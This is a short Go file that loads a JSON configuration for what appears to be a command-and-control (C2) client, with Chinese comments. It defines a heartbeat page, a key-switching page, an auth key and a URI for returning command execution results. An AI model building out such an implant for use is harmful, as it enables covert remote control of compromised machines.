package common

import (
	"encoding/json"
	"io/ioutil"
	"log"
)

// 配置文件对应的结构体
type Config struct {
	CheckInterval int    `json:"checkInterval"` // 检查间隔（秒）
	BannerAuth    string `json:"bannerAuth"`    // 密钥
	SwitchKeyUri  string `json:"switchKeyUri"`  // 密钥页面
	HeartbeatUri  string `json:"heartbeatUri"`  // 心跳页面
	ResultUri     string `json:"resultUri"`     // 接收命令执行内容
}

var MConfig Config

var C2Platform string

// 读取并解析配置文件
func LoadConfig() {
	data, err := ioutil.ReadFile("config.json")
	if err != nil {
		log.Fatalf("读取配置文件出错: %v", err)
	}
	err = json.Unmarshal(data, &MConfig)
	if err != nil {
		log.Fatalf("解析配置文件出错: %v", err)
	}
}
